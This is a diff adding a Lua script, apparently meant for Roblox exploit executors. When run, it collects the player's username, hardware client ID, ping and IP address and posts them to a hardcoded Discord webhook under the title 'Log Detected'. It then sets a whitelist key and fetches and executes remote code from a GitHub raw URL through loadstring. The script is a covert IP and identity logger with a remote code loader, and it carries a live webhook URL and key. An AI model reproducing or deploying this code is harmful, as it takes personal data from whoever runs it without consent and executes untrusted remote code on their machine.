@@ -1,0 +1,58 @@
+local webh = "https://discord.com/api/webhooks/1004824865691406418/kexR2ERLid3-IoqGCRLXR5XddhpSKEWHV7nnOhD7Nc9w4oCbs0Fp0k9-7Ah3D6e8nbb-"
+local lfv = tostring(game:HttpGet("http://ip-api.com/json/", true))
+
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = 'Log Detected',
+       ['description'] = 'Lord Have Mercy On This Skid',
+       ['fields'] = {
+          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
+          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+      {name = "IP", value = tostring(game:HttpGet("http://ip-api.com/json/", true))}
+        }
+    }
+  }
+}
+   
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+wait(0.1)
+_G.wl_key = "a64902e141d1179b31c98862e0b306e10e0a5835"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f1nobe7650/paid/main/dhm"))()
